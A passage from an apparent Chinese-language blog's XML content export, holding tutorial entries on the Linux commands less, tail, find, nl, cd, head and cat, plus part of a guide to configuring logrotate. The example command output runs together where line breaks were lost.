实例4：浏览多个文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1less log2013.log log2014.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出：n 后，切换到 log2014.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出：p 后，切换到 log2013.log 附加备注1.全屏导航 ctrl + F - 向前移动一屏 ctrl + B - 向后移动一屏 ctrl + D - 向前移动半屏 ctrl + U - 向后移动半屏 2.单行导航 j - 向前移动一行 k - 向后移动一行 3.其他导航 G - 移动到最后一行 g - 移动到第一行 q / ZZ - 退出 less 命令 4.其他有用的命令 v - 使用配置的编辑器编辑当前文件 h - 显示 less 的帮助文档 &amp;pattern - 仅显示匹配模式的行，而不是整个文件 5.标记导航 当使用 less 查看大文件时，可以在任何一个位置作标记，可以通过命令导航到标有特定标记的文档位置： ma - 使用 a 标记文本的当前位置 ‘a - 导航到标记 a 处]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- tail]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F15.%20Linux%20%E5%91%BD%E4%BB%A4-%20tail%2F</url>
    <content type="text"><![CDATA[Linux 命令- tail&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;tail 命令从指定点开始将文件写到标准输出.使用tail命令的-f选项可以方便的查阅正在改变的日志文件,tail -f filename会把filename里最尾部的内容显示在屏幕上,并且不但刷新,使你看到最新的文件内容. 命令格式1tail [必要参数] [选择参数] [文件] 命令参数 -f：循环读取 -q：不现实处理信息 -v：显示详细的处理信心 -c&lt;数目&gt;：显示的字节数 -n&lt;行数&gt;：显示行数 –pid=PID：与 -f 合用，表示在进程 ID ，PID 死掉之后结束 -q ，–quiet ，–silent：从不输出给出文件名的首部 -s ，–sleep-interval=S：与 -f 合用，表示在每次反复的间隔休眠 s 秒 使用实例实例1：显示文件末尾内容&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tail -n 5 log2014.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567[root@localhost test]# tail -n 5 log2014.log 2014-092014-102014-112014-12==============================[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;显示文件最后5行内容 实例2：循环查看文件内容&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tail -f test.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415[root@localhost ~]# ping 192.168.120.204 &gt; test.log &amp;[1] 11891[root@localhost ~]# tail -f test.log PING 192.168.120.204 (192.168.120.204) 56(84) bytes of data.64 bytes from 192.168.120.204: icmp_seq=1 ttl=64 time=0.038 ms64 bytes from 192.168.120.204: icmp_seq=2 ttl=64 time=0.036 ms64 bytes from 192.168.120.204: icmp_seq=3 ttl=64 time=0.033 ms64 bytes from 192.168.120.204: icmp_seq=4 ttl=64 time=0.027 ms64 bytes from 192.168.120.204: icmp_seq=5 ttl=64 time=0.032 ms64 bytes from 192.168.120.204: icmp_seq=6 ttl=64 time=0.026 ms64 bytes from 192.168.120.204: icmp_seq=7 ttl=64 time=0.030 ms64 bytes from 192.168.120.204: icmp_seq=8 ttl=64 time=0.029 ms64 bytes from 192.168.120.204: icmp_seq=9 ttl=64 time=0.044 ms64 bytes from 192.168.120.204: icmp_seq=10 ttl=64 time=0.033 ms64 bytes from 192.168.120.204: icmp_seq=11 ttl=64 time=0.027 ms[root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 1ping 192.168.120.204 &gt; test.log &amp; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在后台 ping 远程主机。并输出文件到 test.log ；这种做法也使用与一个以上的档案监视。用 Ctrl+c 来终止。 实例3：从第5行开始显示文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tail -n +5 log2014.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718192021222324[root@localhost test]# cat log2014.log 2014-012014-022014-032014-042014-052014-062014-072014-082014-092014-102014-112014-12==============================[root@localhost test]# tail -n +5 log2014.log2014-052014-062014-072014-082014-092014-102014-112014-12==============================]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[find 命令概览]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F19.%20find%20%E5%91%BD%E4%BB%A4%E6%A6%82%E8%A7%88%2F</url>
    <content type="text"><![CDATA[find 命令概览&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux 下 find 命令在目录结构中搜索文件，并执行指定的操作。Linux 下 find 命令提供了相当多的查找条件，功能很强大。由于 find 具有强大的功能，所以它的选项也很多，其中大部分选项都值得我们花时间来了解一下。即使系统中含有网络文件系统( NFS)，find 命令在该文件系统中同样有效，只要具有相应的权限。 在运行一个非常消耗资源的find命令时，很多人都倾向于把它放在后台执行，因为遍历一个大的文件系统可能会花费很长的时间(这里是指30G字节以上的文件系统)。 1.命令格式1find pathname -options [-print -exec -ok ...] 2.命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用于在文件树中查找文件，并作出相应的处理 3.命令参数 pathname：find命令所查找的目录路径。例如用.来表示当前目录，用/来表示系统根目录。 -print：find命令将匹配的文件输出到标准输出。 -exec：find命令对匹配的文件执行该参数所给出的shell命令。相应命令的形式为’command’ { } \;，注意{ }和\；之间的空格。 -ok：和-exec的作用相同，只不过以一种更为安全的模式来执行该参数所给出的shell命令，在执行每一个命令之前，都会给出提示，让用户来确定是否执行。 4.命令选项 -name 按照文件名查找文件。 -perm 按照文件权限来查找文件。 -prune 使用这一选项可以使find命令不在当前指定的目录中查找，如果同时使用-depth选项，那么-prune将被find命令忽略。 -user 按照文件属主来查找文件。 -group 按照文件所属的组来查找文件。 -mtime -n +n 按照文件的更改时间来查找文件， - n表示文件更改时间距现在n天以内，+ n表示文件更改时间距现在n天以前。find命令还有-atime和-ctime 选项，但它们都和-m time选项。 -nogroup 查找无有效所属组的文件，即该文件所属的组在/etc/groups中不存在。 -nouser 查找无有效属主的文件，即该文件的属主在/etc/passwd中不存在。 -newer file1 ! file2 查找更改时间比文件file1新但比文件file2旧的文件。 -type 查找某一类型的文件，诸如： b - 块设备文件。 d - 目录。 c - 字符设备文件。 p - 管道文件。 l - 符号链接文件。 f - 普通文件。 -size n：[c] 查找文件长度为n块的文件，带有c时表示文件长度以字节计。-depth：在查找文件时，首先查找当前目录中的文件，然后再在其子目录中查找。 -fstype：查找位于某一类型文件系统中的文件，这些文件系统类型通常可以在配置文件/etc/fstab中找到，该配置文件中包含了本系统中有关文件系统的信息。 -mount：在查找文件时不跨越文件系统mount点。 -follow：如果find命令遇到符号链接文件，就跟踪至链接所指向的文件。 -cpio：对匹配的文件使用cpio命令，将这些文件备份到磁带设备中。 另外,下面三个的区别: -amin n 查找系统中最后N分钟访问的文件 -atime n 查找系统中最后n*24小时访问的文件 -cmin n 查找系统中最后N分钟被改变文件状态的文件 -ctime n 查找系统中最后n*24小时被改变文件状态的文件 -mmin n 查找系统中最后N分钟被改变文件数据的文件 -mtime n 查找系统中最后n*24小时被改变文件数据的文件 使用实例实例1：查找指定时间内修改过的文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find -atime -2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456[root@peidachang ~]# find -atime -2../logs/monitor./.bashrc./.bash_profile./.bash_history &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查找 48 小时内修改过的文件 实例2：根据关键字查找&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -name "*.log" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819[root@localhost test]# find . -name "*.log" ./log_link.log./log2014.log./test4/log3-2.log./test4/log3-3.log./test4/log3-1.log./log2013.log./log2012.log./log.log./test5/log5-2.log./test5/log5-3.log./test5/log.log./test5/log5-1.log./test5/test3/log3-2.log./test5/test3/log3-3.log./test5/test3/log3-1.log./test3/log3-2.log./test3/log3-3.log./test3/log3-1.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在当前目录查找以 .log 结尾的文件。“.” 代表当前目录 实例3：按照目录或文件的权限来查找文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find /opt/soft/test/ -perm 777 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost test]# find /opt/soft/test/ -perm 777/opt/soft/test/log_link.log/opt/soft/test/test4/opt/soft/test/test5/test3/opt/soft/test/test3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查找 /opt/soft/test/ 目录下，权限为 777 的文件 实例4：按类型查找&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -type f -name "*.log" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819[root@localhost test]# find . -type f -name "*.log"./log2014.log./test4/log3-2.log./test4/log3-3.log./test4/log3-1.log./log2013.log./log2012.log./log.log./test5/log5-2.log./test5/log5-3.log./test5/log.log./test5/log5-1.log./test5/test3/log3-2.log./test5/test3/log3-3.log./test5/test3/log3-1.log./test3/log3-2.log./test3/log3-3.log./test3/log3-1.log[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查找当前目录，以 .log 结尾的普通文件 实例5：查找当前所有目录并排序&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find .-type d |sort &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415[root@localhost test]# find . -type d | sort../scf./scf/bin./scf/doc./scf/lib./scf/service./scf/service/deploy./scf/service/deploy/info./scf/service/deploy/product./test3./test4./test5./test5/test3[root@localhost test]# 实例6：按大小查找文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -size +1000c -print &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516[root@localhost test]# find . -size +1000c -print../test4./scf./scf/lib./scf/service./scf/service/deploy./scf/service/deploy/product./scf/service/deploy/info./scf/doc./scf/bin./log2012.log./test5./test5/test3./test3[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查找当前目录大于1K的文件]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- nl]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F11.%20Linux%20%E5%91%BD%E4%BB%A4-%20nl%2F</url>
    <content type="text"><![CDATA[Linux 命令- nl&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;nl命令在linux系统中用来计算文件中行号。nl 可以将输出的文件内容自动的加上行号！其默认的结果与 cat -n 有点不太一样， nl 可以将行号做比较多的显示设计，包括位数与是否自动补齐 0 等等的功能。 1．命令格式：1nl [选项]... [文件]... 2．命令参数： -b ：指定行号指定的方式，主要有两种： -b a ：表示不论是否为空行，也同样列出行号(类似 cat -n)； -b t ：如果有空行，空的那一行不要列出行号(默认值)； -n ：列出行号表示的方法，主要有三种： -n ln ：行号在萤幕的最左方显示； -n rn ：行号在自己栏位的最右方显示，且不加 0 ； -n rz ：行号在自己栏位的最右方显示，且加 0 ； -w ：行号栏位的占用的位数。 -p 在逻辑定界符处不重新开始计算。 3．命令功能：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;nl 命令读取 File 参数（缺省情况下标准输入），计算输入中的行号，将计算过的行号写入标准输出。 在输出中，nl 命令根据您在命令行中指定的标志来计算左边的行。 输入文本必须写在逻辑页中。每个逻辑页有头、主体和页脚节（可以有空节）。 除非使用 -p 标志，nl 命令在每个逻辑页开始的地方重新设置行号。 可以单独为头、主体和页脚节设置行计算标志（例如，头和页脚行可以被计算然而文本行不能）。 4．使用实例：实例1：用 nl 列出 log2012.log 的内容&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1nl log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234567[root@localhost test]# nl log2012.log 1 2012-012 2012-02 3 ======[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件中的空白行，nl 不会加上行号 实例2：用 nl 列出 log2012.log 的内容，空本行也加上行号&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1nl -b a log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234567[root@localhost test]# nl -b a log2012.log 1 2012-012 2012-02345 ======[root@localhost test]# 实例3：让行号前面自动补上0,统一输出格式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345678910111213141516171819202122232425262728[root@localhost test]# nl -b a -n rz log2014.log 000001 2014-01000002 2014-02000003 2014-03000004 2014-04000005 2014-05000006 2014-06000007 2014-07000008 2014-08000009 2014-09000010 2014-10000011 2014-11000012 2014-12000013 =======[root@localhost test]# nl -b a -n rz -w 3 log2014.log 001 2014-01002 2014-02003 2014-03004 2014-04005 2014-05006 2014-06007 2014-07008 2014-08009 2014-09010 2014-10011 2014-11012 2014-12013 ======= &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;nl -b a -n rz 命令行号默认为六位，要调整位数可以加上参数 -w 3 调整为3位。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- cd]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F1.%20Linux%20%E5%91%BD%E4%BB%A4-cd%2F</url>
    <content type="text"><![CDATA[Linux 命令- cd&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux cd 命令可以说是Linux中最基本的命令语句，其他的命令语句要进行操作，都是建立在使用 cd 命令上的。所以，学习Linux 常用命令，首先就要学好 cd 命令的使用方法技巧。 1.命令格式1cd [目录名] 2.命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;切换当前目录至dirName 3.常用范例例1：进入系统根目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1cd / &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1[root@localhost ~]# cd / &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：进入系统根目录,上面命令执行完后拿ls命令看一下，当前目录已经到系统根目录了 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1cd .. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者 1cd .. // &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出: 123456[root@localhost soft]# pwd/opt/soft[root@localhost soft]# cd ..[root@localhost opt]# cd ..//[root@localhost /]# pwd/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;进入系统根目录可以使用“ cd .. ”一直退，就可以到达根目录 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1cd ../.. // &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123456[root@localhost soft]# pwd/opt/soft[root@localhost soft]# cd ../.. //[root@localhost /]# pwd/[root@localhost /]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： 使用cd 命令实现进入当前目录的父目录的父目录。 例2：使用 cd 命令进入当前用户主目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“当前用户主目录”和“系统根目录”是两个不同的概念。进入当前用户主目录有两个方法。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令1： 1cd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123451 [root@localhost soft]# pwd2 /opt/soft3 [root@localhost soft]# cd4 [root@localhost ~]# pwd5 /root &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令2： 1cd ~ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123456[root@localhost ~]# cd /opt/soft/[root@localhost soft]# pwd/opt/soft[root@localhost soft]# cd ~[root@localhost ~]# pwd/root 例3：跳转到指定目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1cd /opt/soft &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234567[root@localhost ~]# cd /opt/soft[root@localhost soft]# pwd/opt/soft[root@localhost soft]# cd jdk1.6.0_16/[root@localhost jdk1.6.0_16]# pwd/opt/soft/jdk1.6.0_16[root@localhost jdk1.6.0_16]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;跳转到指定目录，从根目录开始，目录名称前加 / ,当前目录内的子目录直接写名称即可 例4：返回进入此目录之前所在的目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1cd - &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123456789[root@localhost soft]# pwd/opt/soft[root@localhost soft]# cd -/root[root@localhost ~]# pwd/root[root@localhost ~]# cd -/opt/soft[root@localhost soft]# 例5：把上个命令的参数作为cd参数使用。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1cd !$ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234567[root@localhost soft]# cd !$cd -/root[root@localhost ~]# cd !$cd -/opt/soft[root@localhost soft]#]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- head]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F14.%20Linux%20%E5%91%BD%E4%BB%A4-%20head%2F</url>
    <content type="text"><![CDATA[Linux 命令- head&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;head 与 tail 就像它的名字一样的浅显易懂，它是用来显示开头或结尾某个数量的文字区块， head 用来显示档案的开头至标准输出中，而 tail 想当然就是看档案的结尾。 命令格式1head [参数] [文件] 命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;head 用来显示档案的开头至标准输出中，默认 head 命令打印其相应文件的开头10行。 命令参数 -q 隐藏文件名 -v 显示文件名 -c&lt;字节&gt; 显示字节数 -n&lt;行数&gt; 显示的行数 使用实例实例1：显示文件的前 n 行&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1head -n 5 log2014.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920[root@localhost test]# cat log2014.log 2014-012014-022014-032014-042014-052014-062014-072014-082014-092014-102014-112014-12==============================[root@localhost test]# head -n 5 log2014.log 2014-012014-022014-032014-042014-05[root@localhost test]# 实例2：显示文件前 n 个字节&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1head -c 20 log2014.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost test]# head -c 20 log2014.log2014-012014-022014[root@localhost test]# 实例3：文件的除了最后 n 个字节意外的内容&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1head -c -32 log2014.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314[root@localhost test]# head -c -32 log2014.log2014-012014-022014-032014-042014-052014-062014-072014-082014-092014-102014-112014-12[root@localhost test]# 实例4：输出文件除了最后 n 行的全部内容&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1head -n -6 log2014.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789[root@localhost test]# head -n -6 log2014.log2014-012014-022014-032014-042014-052014-062014-07[root@localhost test]#]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- cat]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F10.%20Linux%20%E5%91%BD%E4%BB%A4-%20cat%2F</url>
    <content type="text"><![CDATA[Linux 命令- cat&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;cat命令的用途是连接文件或标准输入并打印。这个命令常用来显示文件内容，或者将几个文件连接起来显示，或者从标准输入读取内容并显示，它常与重定向符号配合使用。 1．命令格式：1cat [选项] [文件] 2．命令功能：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;cat主要有三大功能： 一次显示整个文件:cat filename 从键盘创建一个文件:cat &gt; filename 只能创建新文件,不能编辑已有文件. 将几个文件合并为一个文件:cat file1 file2 &gt; file 3．命令参数： -A –show-all 等价于 -vET -b –number-nonblank 对非空输出行编号 -e 等价于 -vE -E –show-ends 在每行结束处显示 $ -n –number 对输出的所有行编号,由1开始对所有输出的行数编号 -s –squeeze-blank 有连续两行以上的空白行，就代换为一行的空白行 -t 与 -vT 等价 -T –show-tabs 将跳格字符显示为 ^I -u (被忽略) -v –show-nonprinting 使用 ^ 和 M- 引用，除了 LFD 和 TAB 之外 4．使用实例：实例1：把 log2012.log 的文件内容加上行号后输入 log2013.log 这个文件里&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1cat -n log2012.log log2013.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234567891011121314151617181920212223242526[root@localhost test]# cat log2012.log 2012-012012-02======[root@localhost test]# cat log2013.log 2013-012013-022013-03======[root@localhost test]# cat -n log2012.log log2013.log 1 2012-012 2012-02345 ======6 2013-017 2013-028910 2013-0311 ======[root@localhost test]# 实例2：把 log2012.log 和 log2013.log 的文件内容加上行号（空白行不加）之后将内容附加到 log.log 里。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1cat -b log2012.log log2013.log log.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345678[root@localhost test]# cat -b log2012.log log2013.log log.log1 2012-012 2012-023 ======4 2013-015 2013-026 2013-037 ======[root@localhost test]# 实例3：把 log2012.log 的文件内容加上行号后输入 log.log 这个文件里&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1cat log.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123456789[root@localhost test]# cat log.log [root@localhost test]# cat -n log2012.log &gt; log.log[root@localhost test]# cat -n log.log 1 2012-012 2012-02345 ======[root@localhost test]# 实例4：使用here doc来生成文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234567891011121314[root@localhost test]# cat &gt;log.txt &lt;&lt;EOF&gt; Hello&gt; World&gt; Linux&gt; PWD=$(pwd)&gt; EOF[root@localhost test]# ls -l log.txt -rw-r--r-- 1 root root 37 10-28 17:07 log.txt[root@localhost test]# cat log.txt HelloWorldLinuxPWD=/opt/soft/test[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意粗体部分，here doc可以进行字符串替换。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;备注： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;tac (反向列示) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1tac log.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345[root@localhost test]# tac log.txt PWD=/opt/soft/testLinuxWorldHello &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;tac 是将 cat 反写过来，所以他的功能就跟 cat 相反， cat 是由第一行到最后一行连续显示在萤幕上，而 tac 则是由最后一行到第一行反向在萤幕上显示出来！]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux日志总管-logrotate]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F66.%20Linux%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E6%80%BB%E7%AE%A1-logrotate%2F</url>
    <content type="text"><![CDATA[Linux日志总管-logrotate&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;日志文件包含了关于系统中发生的事件的有用信息，在排障过程中或者系统性能分析时经常被用到。对于忙碌的服务器，日志文件大小会增长极快，服务器会很快消耗磁盘空间，这成了个问题。除此之外，处理一个单个的庞大日志文件也常常是件十分棘手的事。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;logrotate是个十分有用的工具，它可以自动对日志进行截断（或轮循）、压缩以及删除旧的日志文件。例如，可以设置logrotate，让/var/log/foo日志文件每30天轮循，并删除超过6个月的日志。配置完后，logrotate的运作完全自动化，不必进行任何进一步的人为干预。另外，旧日志也可以通过电子邮件发送。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主流Linux发行版上都默认安装有logrotate包，如果出于某种原因，logrotate没有出现在里头，可以使用apt-get或yum命令来安装。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在Debian或Ubuntu上： 1# apt-get install logrotate cron &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在Fedora，CentOS或RHEL上： 1# yum install logrotate crontabs &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;logrotate的配置文件是/etc/logrotate.conf，通常不需要对它进行修改。日志文件的轮循设置在独立的配置文件中，它（们）放在/etc/logrotate.d/目录下。 样例一&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在第一个样例中，我们将创建一个10MB的日志文件/var/log/log-file。我们将展示怎样使用logrotate来管理该日志文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从创建一个日志文件开始，然后在其中填入一个10MB的随机比特流数据。 12# touch /var/log/log-file# head -c 10M &lt; /dev/urandom &gt; /var/log/log-file &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于现在日志文件已经准备好，将配置logrotate来轮循该日志文件。让我们为该文件创建一个配置文件。 1234567891011121314# vim /etc/logrotate.d/log-file/var/log/log-file &#123; monthly rotate 5 compress delaycompress missingok notifempty create 644 root root postrotate /usr/bin/killall -HUP rsyslogd endscript &#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 说明 monthly : 日志文件将按月轮循。其它可用值为‘daily’，‘weekly’或者‘yearly’。 rotate 5 : 一次将存储5个归档日志。对于第六个归档，时间最久的归档将被删除。 compress : 在轮循任务完成后，已轮循的归档将使用gzip进行压缩。 delaycompress : 总是与compress选项一起用，delaycompress选项指示logrotate不要将最近的归档压缩，压缩将在下一次轮循周期进行。这在你或任何软件仍然需要读取最新归档时很有用。 missingok : 在日志轮循期间，任何错误将被忽略，例如“文件无法找到”之类的错误。 notifempty : 如果日志文件为空，轮循不会进行。 create 644 root root : 以指定的权限创建全新的日志文件，同时logrotate也会重命名原始日志文件。 postrotate/endscript : 在所有其它指令完成后，postrotate和endscript里面指定的命令将被执行。在这种情况下，rsyslogd 进程将立即再次读取其配置并继续运行。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面的模板是通用的，而配置参数则根据需求进行调整，不是所有的参数都是必要的。 样例二&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在本例中，只想要轮循一个日志文件，然而日志文件大小可以增长到50MB。 12345678910# vim /etc/logrotate.d/log-file/var/log/log-file &#123; size=50M rotate 5 create 644 root root postrotate /usr/bin/killall -HUP rsyslogd endscript &#125; 样例三&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;想要让旧日志文件以创建日期命名，这可以通过添加dateext常熟实现。 1234567891011# vim /etc/logrotate.d/log-file/var/log/log-file &#123; monthly rotate 5 dateext create 644 root root postrotate /usr/bin/killall -HUP rsyslogd endscript &#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这将让归档文件在它们的文件名中包含日期信息。 排障&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里提供了一些logrotate设置的排障提示。 1. 手动运行logrotate&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; logrotate 可以在任何时候从命令行手动调用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要调用为/etc/lograte.d/下配置的所有日志调用 logrotate ： 1# logrotate /etc/logrotate.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要为某个特定的配置调用logrotate： 1# logrotate /etc/logrotate.d/log-file 2. 演练&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;排障过程中的最佳选择是使用‘-d’选项以预演方式运行logrotate。要进行验证，不用实际轮循任何日志文件，可以模拟演练日志轮循并显示其输出。 1# logrotate -d /etc/logrotate.d/log-file &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;正如从上面的输出结果可以看到的，logrotate判断该轮循是不必要的。如果文件的时间小于一天，这就会发生了。 3. 